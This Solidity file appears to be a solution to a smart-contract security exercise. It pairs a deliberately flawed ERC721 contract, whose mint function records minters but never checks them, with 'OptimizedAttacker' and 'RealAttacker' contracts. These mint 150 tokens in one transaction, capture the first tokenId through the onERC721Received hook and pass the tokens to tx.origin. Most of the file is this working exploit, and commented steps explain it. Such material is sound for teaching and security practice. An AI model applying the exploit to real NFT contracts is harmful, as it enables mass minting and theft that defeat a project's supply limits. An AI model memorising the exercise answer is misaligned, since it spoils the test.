//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import '@openzeppelin/contracts/token/ERC721/ERC721.sol';

// You may not modify this contract or the openzeppelin contracts
contract NotRareToken is ERC721 {
    mapping(address => bool) private alreadyMinted;

    uint256 private totalSupply;

    constructor() ERC721('NotRareToken', 'NRT') {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        alreadyMinted[msg.sender] = true;
    }
}

// 1. Deployed another contract to mint NFTs because we need to obtain the tokenId of the minted NFTs in order to transfer them to the initiator of the transaction.
// 2. Invoked the mint function of the NotRareToken contract, triggering the execution of the onERC721Received hook.
// 3. Utilized the aforementioned hook to store the tokenId of the first minted NFT, enabling us to initiate the transfer of NFTs starting from that particular tokenId.
// 4. Transferred the NFTs back to the initiator of the transaction.

contract OptimizedAttacker {
    constructor(address victim) {
        new RealAttacker().hack(NotRareToken(victim));
    }
}

contract RealAttacker {
    uint256 tokenId;

    function hack(NotRareToken _nftContract) external {
        for (uint256 i; i < 150; i++) {
            _nftContract.mint();
        }

        uint256 _tokenId = tokenId;
        for (uint256 i; i < 150; i++) {
            _nftContract.safeTransferFrom(address(this), tx.origin, _tokenId++);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (tokenId == 0) {
            tokenId = _tokenId;
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
